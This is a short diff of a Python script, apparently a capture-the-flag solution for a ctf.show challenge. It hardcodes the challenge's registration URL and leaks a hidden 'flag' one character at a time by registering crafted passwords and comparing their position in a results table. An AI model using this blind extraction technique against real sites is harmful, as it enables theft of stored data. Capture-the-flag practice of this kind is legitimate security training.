@@ -12,7 +12,7 @@ for i in range(48):
             'nickname':'123',
             'password':index
         }
-        t=requests.post(url,data=data,timeout=1)
+        t=requests.post("http://d6de054a-781e-4910-976b-5b236140d353.challenge.ctf.show/reg.html",data=data,timeout=1)
         t=requests.get(url,headers=headers,timeout=1).text
         if t.find(f"<td>{index}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
